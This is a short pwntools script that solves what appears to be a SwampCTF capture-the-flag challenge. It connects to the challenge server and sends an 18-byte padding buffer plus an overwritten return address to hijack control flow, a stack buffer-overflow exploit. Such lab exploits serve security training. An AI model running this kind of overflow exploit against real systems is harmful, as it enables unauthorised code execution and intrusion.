from pwn import *

context.binary = binary ='./binary'

#p=process()
p=remote('chals.swampctf.com',40001)
payload = b'A'*18
payload += p64(0x00401186)

p.sendline(payload)

p.interactive()
